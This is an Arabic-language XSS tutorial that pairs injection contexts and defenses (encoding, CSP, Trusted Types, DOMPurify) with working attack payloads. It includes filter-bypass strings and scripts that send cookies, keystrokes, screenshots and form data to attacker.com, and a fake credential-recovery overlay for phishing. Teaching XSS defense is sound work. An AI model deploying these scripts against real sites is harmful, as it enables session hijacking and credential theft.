















  _______  __   __  _______ 
 /  ___  ||  | |  ||       |
|  |   | ||  |_|  ||    ___|
|  |   | ||       ||   |___ 
|  |   | ||       ||    ___|
|  |___| ||   _   ||   |___ 
|_______||__| |__||_______|

     💀 XSS VULNERABILITY 💀
       Hack it | Patch it












# أساسيات هجمات Cross-Site Scripting (XSS)

## مقدمة تفصيلية

Cross-Site Scripting (XSS) هي واحدة من أكثر ثغرات أمان الويب انتشارًا وخطورة في العالم الرقمي. تحتل هذه الثغرات مرتبة متقدمة في قائمة OWASP Top 10 للمخاطر الأمنية لسنوات عديدة. في هذا المستند، سنتعمق في فهم آليات عمل هجمات XSS، وكيفية اكتشافها والوقاية منها.

```
+---------------------+        +------------------+        +--------------------+
|                     |        |                  |        |                    |
|  المهاجم Attacker   +------->|  الموقع Website  +------->|  الضحية Victim     |
|                     |        |                  |        |                    |
+---------------------+        +------------------+        +--------------------+
        |                              ^                           |
        |                              |                           |
        |      حقن كود JavaScript       |                           |
        |      Inject JS Code          |   تنفيذ الكود الخبيث       |
        +------------------------------+      Execute Code         |
                                       |                           |
                                       +---------------------------+
```

## الآلية الأساسية

تحدث هجمات XSS عندما يتمكن المهاجم من حقن شيفرات برمجية (غالبًا JavaScript) في صفحة ويب يعرضها مستخدمون آخرون. عندما يتم تنفيذ هذه الشيفرات في متصفح الضحية، يمكنها سرقة معلومات حساسة، أو تغيير محتوى الموقع، أو إعادة توجيه المستخدم إلى مواقع أخرى.

### دورة حياة هجوم XSS نموذجية

```
      +----------+
      | البداية  |
      +----+-----+
           |
           v
+---------------------+
| يكتشف المهاجم ثغرة  |
+----------+----------+
           |
           v
+---------------------+
| يصمم المهاجم الكود  |
+----------+----------+
           |
           v
+---------------------+
|  يُحقن الكود في    |
|  الموقع المستهدف   |
+----------+----------+
           |
           v
+---------------------+
| تزور الضحية الموقع |
+----------+----------+
           |
           v
+---------------------+
| يُنفّذ المتصفح     |
| الكود الخبيث       |
+----------+----------+
           |
           v
+---------------------+
| يتم تسريب معلومات  |
| أو تنفيذ هجوم      |
+----------+----------+
           |
           v
      +----------+
      | النهاية  |
      +----------+
```

## سياقات ثغرات XSS

تحدث هجمات XSS في سياقات مختلفة من صفحة الويب، ومن المهم فهم هذه السياقات لتقييم المخاطر وتطبيق الحماية المناسبة:

### 1. سياق HTML

```html
<div>مرحبًا، [مدخلات المستخدم]</div>
```

إذا كانت مدخلات المستخدم:
```
<script>alert('XSS')</script>
```

ستصبح النتيجة:
```html
<div>مرحبًا، <script>alert('XSS')</script></div>
```

### 2. سياق سمة HTML

```html
<input type="text" value="[مدخلات المستخدم]">
```

إذا كانت مدخلات المستخدم:
```
" onmouseover="alert('XSS')
```

ستصبح النتيجة:
```html
<input type="text" value="" onmouseover="alert('XSS')">
```

### 3. سياق JavaScript

```html
<script>
    var username = '[مدخلات المستخدم]';
    document.getElementById('greeting').innerHTML = 'مرحبًا ' + username;
</script>
```

إذا كانت مدخلات المستخدم:
```
';alert('XSS');//
```

ستصبح النتيجة:
```html
<script>
    var username = '';alert('XSS');//';
    document.getElementById('greeting').innerHTML = 'مرحبًا ' + username;
</script>
```

### 4. سياق URL

```html
<a href="https://example.com/search?q=[مدخلات المستخدم]">بحث</a>
```

إذا كانت مدخلات المستخدم:
```
javascript:alert('XSS')
```

ستصبح النتيجة:
```html
<a href="javascript:alert('XSS')">بحث</a>
```

### 5. سياق CSS

```html
<div style="color:[مدخلات المستخدم]">نص ملون</div>
```

إذا كانت مدخلات المستخدم:
```
red;}</style><script>alert('XSS')</script><!--
```

ستصبح النتيجة:
```html
<div style="color:red;}</style><script>alert('XSS')</script><!--">نص ملون</div>
```

## أنواع هجمات XSS المتقدمة

### XSS المتعدد المراحل (Multi-stage XSS)

هذه الهجمات تستخدم مراحل متعددة، حيث يقوم الكود الخبيث الأولي بتحميل كود آخر أكثر تعقيدًا من مصدر خارجي.

```html
<script>
    // المرحلة الأولى: تحميل سكريبت خارجي
    var script = document.createElement('script');
    script.src = 'https://attacker.com/malicious.js';
    document.body.appendChild(script);
</script>
```

### هجمات DOM Clobbering

تستهدف هذه الهجمات بنية DOM للصفحة لتجاوز بعض وسائل الحماية.

```html
<form id="config">
    <input name="csrf_token" value="attacker_controlled">
</form>

<script>
    // عند استخدام config.csrf_token، سيتم استخدام القيمة الخبيثة
    if (document.forms.config.csrf_token.value === storedToken) {
        // عملية غير آمنة
    }
</script>
```

### الهجمات القائمة على الذاكرة (XS-Leaks)

تستغل هذه الهجمات آليات عمل المتصفح للكشف عن معلومات حساسة دون سرقتها مباشرة.

```javascript
// قياس وقت استجابة الخادم للكشف عن معلومات حساسة
const startTime = performance.now();
fetch('/api/user/profile/private-data')
    .then(() => {
        const endTime = performance.now();
        if (endTime - startTime < 10) {
            // استنتاج معلومات عن حالة المستخدم
        }
    });
```

## تقنيات متقدمة لاستغلال ثغرات XSS

### تجاوز تقنيات الترميز والتصفية

#### استخدام التعليقات HTML

```html
<img/src="x"onerror=alert('XSS')//"/>
```

#### استخدام الترميزات البديلة

```html
<!-- ترميز أوني كود -->
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>

<!-- ترميز ست عشري -->
<script>&#x61;&#x6c;&#x65;&#x72;&#x74;('XSS')</script>

<!-- ترميز عشري -->
<script>&#97;&#108;&#101;&#114;&#116;('XSS')</script>
```

#### تقنيات تشغيل JavaScript بدون استخدام كلمة `script`

```html
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
<body onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<video src=1 onerror=alert('XSS')>
<audio src=1 onerror=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<details open ontoggle=alert('XSS')>
<table background="javascript:alert('XSS')">
```

### استخدام CSS لتنفيذ XSS

```html
<style>
@keyframes x {
    from { background: url("javascript:alert('XSS')"); }
}
#victim {
    animation-name: x;
    animation-duration: 1s;
}
</style>
<div id="victim"></div>
```

## مهام هجوم XSS المتقدمة

### 1. سرقة الكوكيز

```javascript
// إرسال كوكيز الجلسة إلى خادم المهاجم
new Image().src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);

// طريقة بديلة باستخدام Fetch API
fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({cookie: document.cookie}),
    headers: {"Content-Type": "application/json"}
});
```

### 2. التقاط بيانات النماذج

```javascript
// التقاط بيانات النماذج بأكملها
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", function(e) {
        const formData = new FormData(form);
        const data = {};
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        // إرسال البيانات إلى المهاجم
        navigator.sendBeacon("https://attacker.com/steal", JSON.stringify(data));
    });
});
```

### 3. تزييف طلبات العميل (CSRF عبر XSS)

```javascript
// حقن طلب لتغيير كلمة المرور
function changePwd() {
    const req = new XMLHttpRequest();
    req.open("POST", "/api/account/change-password", true);
    req.setRequestHeader("Content-Type", "application/json");
    req.withCredentials = true;
    req.send(JSON.stringify({
        "newPassword": "hackedPassword123",
        "confirmPassword": "hackedPassword123"
    }));
}
changePwd();
```

### 4. التقاط لقطات الشاشة

```javascript
// استخدام HTML2Canvas لالتقاط لقطة شاشة
const script = document.createElement('script');
script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
script.onload = function() {
    html2canvas(document.body).then(canvas => {
        // تحويل اللقطة إلى صورة
        const image = canvas.toDataURL('image/png');
        // إرسال الصورة إلى المهاجم
        fetch('https://attacker.com/screenshot', {
            method: 'POST',
            body: image
        });
    });
};
document.body.appendChild(script);
```

### 5. التسجيل الكامل للضغطات المفاتيح

```javascript
// تسجيل ضغطات المفاتيح
const keys = [];
document.addEventListener('keydown', function(e) {
    keys.push({
        key: e.key,
        time: new Date().getTime(),
        target: e.target.nodeName,
        id: e.target.id
    });
    
    // إرسال البيانات كل 10 ضغطات
    if (keys.length >= 10) {
        navigator.sendBeacon("https://attacker.com/keylog", JSON.stringify(keys));
        keys.length = 0; // تفريغ المصفوفة
    }
});
```

## اكتشاف ثغرات XSS المتقدمة

### الاختبار اليدوي

للاكتشاف المتقدم، يمكن استخدام سلسلة من الشيفرات الاختبارية المصممة للتغلب على آليات الحماية المختلفة:

```
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
"autofocus onfocus=alert(1)//
javascript:alert(1)
'-alert(1)-'
");alert(1);//
`-alert(1)`
\";alert(1);//
```

### Blind XSS

في حالات الـ Blind XSS، لا يمكن رؤية نتيجة الاستغلال مباشرة. يتم استخدام تقنيات مثل:

```html
<script src="https://attacker.com/log.js"></script>
```

حيث يقوم ملف `log.js` بتسجيل معلومات تعريفية وإرسالها إلى خادم المهاجم:

```javascript
// محتوى ملف log.js
fetch('https://attacker.com/blind-xss-log', {
    method: 'POST',
    body: JSON.stringify({
        url: location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        userAgent: navigator.userAgent,
        time: new Date().toString(),
        DOM: document.documentElement.outerHTML.substring(0, 5000)
    })
});
```

## آليات الحماية المتقدمة من XSS

### 1. ترميز المخرجات السياقي (Context-Aware Output Encoding)

الترميز حسب السياق هو أهم آلية للحماية من XSS:

```javascript
// ترميز سياق HTML
function encodeHTML(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// ترميز سياق JavaScript
function encodeJS(str) {
    return String(str)
        .replace(/\\/g, '\\\\')
        .replace(/'/g, '\\\'')
        .replace(/"/g, '\\"')
        .replace(/`/g, '\\`')
        .replace(/\//g, '\\/')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/\t/g, '\\t');
}

// ترميز سياق سمات HTML
function encodeHTMLAttribute(str) {
    return String(str)
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// ترميز سياق URL
function encodeURLParam(str) {
    return encodeURIComponent(str);
}
```

### 2. سياسة أمان المحتوى المتقدمة (Content Security Policy - CSP)

```
Content-Security-Policy: default-src 'self'; 
                         script-src 'self' https://trusted-cdn.com; 
                         style-src 'self' https://trusted-cdn.com; 
                         img-src 'self' data:; 
                         connect-src 'self' https://api.example.com; 
                         frame-src 'none'; 
                         object-src 'none'; 
                         base-uri 'self';
                         form-action 'self';
                         frame-ancestors 'none';
                         report-uri /csp-violation-report;
                         require-trusted-types-for 'script';
```

### 3. Subresource Integrity (SRI)

```html
<script src="https://cdn.example.com/script.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

### 4. نمط أمان التطبيقات الحديثة: Trusted Types

```javascript
// تعريف سياسة Trusted Types
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (string) => {
            const sanitized = DOMPurify.sanitize(string);
            return sanitized;
        },
        createScriptURL: (string) => {
            // فقط السماح بروابط من نطاق محدد
            if (string.startsWith('https://trusted-cdn.com/')) {
                return string;
            }
            throw new Error('غير مسموح بهذا المصدر: ' + string);
        },
        createScript: (string) => {
            // ربما استخدام مكتبات تحليل JavaScript للتحقق من السلامة
            return string;
        }
    });
}
```

### 5. استخدام مكتبات التطهير (Sanitization Libraries)

```javascript
// استخدام DOMPurify
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOW_DATA_ATTR: false,
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onload', 'onerror', 'onclick'],
    SANITIZE_DOM: true
});

document.getElementById('content').innerHTML = clean;
```

## تحليل الأثر (Forensic Analysis) للهجمات

بعد اكتشاف هجوم XSS، من المهم تحليل الأثر لفهم مدى الضرر:

```
+----------------------+       +------------------------+       +------------------+
|                      |       |                        |       |                  |
| تحليل الشيفرة الخبيثة +------>+ تحديد البيانات المسربة +------>+ تقييم الأثر       |
|                      |       |                        |       |                  |
+----------------------+       +------------------------+       +------------------+
         |                                 |                             |
         v                                 v                             v
+----------------------+       +------------------------+       +------------------+
|                      |       |                        |       |                  |
| تحليل سجلات الخادم   +------>+ تتبع نشاط المهاجم       +------>+ إجراءات التخفيف   |
|                      |       |                        |       |                  |
+----------------------+       +------------------------+       +------------------+
```

## سيناريوهات متقدمة لمحاكاة هجمات XSS

### سيناريو 1: هجوم XSS مع data exfiltration

```javascript
// الكود المحقون في الموقع المصاب
(function() {
    // 1. جمع بيانات الضحية
    const victim = {
        url: location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        screenRes: `${screen.width}x${screen.height}`,
        browser: navigator.userAgent,
        ip: '', // سيتم تحديده من الخادم
        time: new Date().toString()
    };
    
    // 2. التقاط لقطة شاشة
    const captureScreen = async () => {
        const script = document.createElement('script');
        script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
        document.body.appendChild(script);
        
        return new Promise(resolve => {
            script.onload = async () => {
                const canvas = await html2canvas(document.body);
                victim.screenshot = canvas.toDataURL('image/png');
                resolve();
            };
        });
    };
    
    // 3. التقاط بيانات النماذج
    const captureFormData = () => {
        const forms = {};
        document.querySelectorAll('form').forEach((form, index) => {
            const formData = {};
            form.querySelectorAll('input, select, textarea').forEach(input => {
                if (input.name || input.id) {
                    formData[input.name || input.id] = input.value;
                }
            });
            forms[`form_${index}`] = formData;
        });
        victim.forms = forms;
    };
    
    // 4. إرسال البيانات المسروقة
    const exfiltrateData = async () => {
        await captureScreen();
        captureFormData();
        
        // استخدام طرق مختلفة للتحايل على الحماية
        try {
            // محاولة استخدام Beacon API أولاً
            if (navigator.sendBeacon) {
                navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(victim));
                return;
            }
            
            // محاولة استخدام Fetch API
            await fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(victim),
                headers: {'Content-Type': 'application/json'},
                mode: 'no-cors'
            });
        } catch (e) {
            // طريقة بديلة: استخدام الصور
            const encodedData = encodeURIComponent(JSON.stringify(victim));
            new Image().src = `https://attacker.com/collect-img?data=${encodedData}`;
        }
    };
    
    // تنفيذ الهجوم
    exfiltrateData();
})();
```

### سيناريو 2: هجوم virtual defacement عبر XSS

```javascript
(function() {
    // 1. إنشاء محتوى مزيف
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: white;
        z-index: 999999;
        overflow: auto;
    `;
    
    // 2. إضافة محتوى مزيف
    overlay.innerHTML = `
        <style>
            body { margin: 0; font-family: Arial, sans-serif; }
            .header { background-color: #FF0000; color: white; padding: 20px; text-align: center; }
            .content { padding: 20px; }
        </style>
        <div class="header">
            <h1>تم اختراق هذا الموقع!</h1>
        </div>
        <div class="content">
            <h2>تم الاستيلاء على الموقع بواسطة مجموعة القراصنة XYZ</h2>
            <p>تم تسريب جميع بياناتكم وستنشر قريباً...</p>
            <img src="https://attacker.com/hacked-logo.png" alt="Hacked">
            
            <!-- نموذج مزيف لسرقة معلومات إضافية -->
            <h3>لاستعادة وصولك، يرجى تأكيد هويتك:</h3>
            <form id="fake-recovery" onsubmit="sendCredentials(); return false;">
                البريد الإلكتروني: <input type="email" id="email" required><br><br>
                كلمة المرور: <input type="password" id="password" required><br><br>
                <button type="submit">استعادة الوصول</button>
            </form>
        </div>
    `;
    
    // 3. إضافة وظيفة لسرقة بيانات الاعتماد
    window.sendCredentials = function() {
        const data = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            domain: location.hostname,
            time: new Date().toString()
        };
        
        fetch('https://attacker.com/collect-credentials', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {'Content-Type': 'application/json'},
            mode: 'no-cors'
        });
        
        alert('شكراً! سيتم استعادة حسابك خلال 24 ساعة.');
        return false;
    };
    
    // 4. إضافة المحتوى إلى الصفحة
    document.body.appendChild(overlay);
    
    // 5. منع إزالة المحتوى المزيف
    setInterval(() => {
        if (!document.body.contains(overlay)) {
            document.body.appendChild(overlay);
        }
    }, 500);
})();
```

## الخلاصة

هجمات XSS، رغم كونها معروفة منذ سنوات، لا تزال تشكل تهديدًا كبيرًا لأمان تطبيقات الويب. إن فهم الآليات المعقدة لهذه الهجمات وسياقاتها المختلفة يعد أمرًا ضروريًا لتطوير استراتيجيات دفاعية فعالة. 

من خلال تطبيق مبدأ الترميز السياقي للمخرجات، واستخدام سياسة أمان المحتوى، وتبني أطر العمل الحديثة التي توفر حماية مدمجة ضد XSS، يمكن للمطورين تقليل مخاطر هذه الهجمات بشكل كبير.

المفتاح هو تبني نهج "الدفاع في العمق" الذي يجمع بين عدة طبقات من آليات الحماية، مع الاستمرار في إجراء اختبارات أمان دورية واعتماد أفضل الممارسات في تطوير البرمجيات الآمنة.
